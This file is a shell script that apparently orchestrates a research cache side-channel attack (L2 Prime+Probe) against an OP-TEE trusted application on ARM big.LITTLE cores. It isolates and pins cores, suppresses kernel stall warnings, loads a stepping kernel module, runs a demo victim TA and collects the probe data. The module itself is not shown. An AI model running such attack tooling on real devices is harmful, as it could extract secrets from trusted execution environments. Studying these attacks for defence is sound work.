#!/bin/sh

# taskset 20 ./attack_script.sh A53 L2_PP 200000
# taskset 08 ./attack_script.sh A73 L2_PP 200000

BIG_LITTLE=$1
TARGET_UARCH=$2
IRQ_INTERVAL=$3

case $BIG_LITTLE in
	A73)
		L2_NUM_SETS="2048"
		AUX_CORE="2"
		VIM_CORE="4"
		DISABLE_CORE="5 6 7"
		CORE_FRQ="903000"
		CORE_AFF="10"
		;;
	A53)
		L2_NUM_SETS="512"
		AUX_CORE="4"
		VIM_CORE="2"
		DISABLE_CORE="0 1 3"
		CORE_FRQ="533000"
		CORE_AFF="04"
		;;
	*)
		echo "BIG_LITTLE = Unknown"
		exit 1
		;;
esac

case $TARGET_UARCH in
	L2_PP)
		set_side_channel="0"
		SET_GET_DATA="$L2_NUM_SETS"
		;;
	# other side-channel attacks...
	*)
		echo "TARGET_UARCH = Unknown"
		exit 1
		;;
esac

# remove module before install
rmmod Load_Step.ko
sleep 0.5

# shutdown all cores may be used
for i in $AUX_CORE $VIM_CORE $DISABLE_CORE; do
        echo 0 > /sys/devices/system/cpu/cpu$i/online
done

sleep 0.5

# enable the target core
for i in $AUX_CORE $VIM_CORE; do
        echo 1 > /sys/devices/system/cpu/cpu$i/online
done

sleep 0.5

# awake the taget core
for i in $AUX_CORE $VIM_CORE; do
    for j in 0 1 2; do
        echo 1 > /sys/devices/system/cpu/cpu$i/cpuidle/state$j/disable;
    done;
done

sleep 0.5

# prevent rcu warnning
echo 160 > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
echo 1 > /sys/module/rcupdate/parameters/rcu_cpu_stall_suppress
sleep 0.5

# install module
insmod Load_Step.ko
sleep 0.5

# DVFS control
echo userspace > /sys/devices/system/cpu/cpu$VIM_CORE/cpufreq/scaling_governor
echo $CORE_FRQ > /sys/devices/system/cpu/cpu$VIM_CORE/cpufreq/scaling_setspeed
VIM_FRQ=`cat /sys/devices/system/cpu/cpu$VIM_CORE/cpufreq/scaling_cur_freq`
AUX_FRQ=`cat /sys/devices/system/cpu/cpu$AUX_CORE/cpufreq/scaling_cur_freq`

# start execution
echo $set_side_channel > /sys/kernel/debug/Load_Step/set_side_channel
sleep 0.05
echo $IRQ_INTERVAL > /sys/kernel/debug/Load_Step/set_enable
sleep 0.01
# victim TA
taskset $CORE_AFF optee_example_hello_world
sleep 0.05
echo 0 > /sys/kernel/debug/Load_Step/set_disable
sleep 1

# get debugfs data
rm -f data.csv
GET_DATA_RESULT=`./get_data $SET_GET_DATA`
sleep 0.5

# recover rcu timeout
echo 21 > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
echo 0 > /sys/module/rcupdate/parameters/rcu_cpu_stall_suppress
sleep 0.5

# recover DVFS control
echo performance > /sys/devices/system/cpu/cpu$VIM_CORE/cpufreq/scaling_governor
sleep 0.5

# idle target cores
for i in $AUX_CORE $VIM_CORE; do
    for j in 0 1 2; do
        echo 0 > /sys/devices/system/cpu/cpu$i/cpuidle/state$j/disable;
    done;
done

sleep 0.5

# enable cores previously turned off
for i in $DISABLE_CORE; do
        echo 1 > /sys/devices/system/cpu/cpu$i/online
done

# remove module at last
rmmod Load_Step.ko
sleep 0.5

echo "BIG_LITTLE = $BIG_LITTLE"
echo "TARGET_UARCH = $TARGET_UARCH"
echo "IRQ_INTERVAL = $IRQ_INTERVAL"
echo "VIM: cpu$VIM_CORE's frq is:$VIM_FRQ"
echo "AUX: cpu$AUX_CORE's frq is:$AUX_FRQ"
echo "$GET_DATA_RESULT"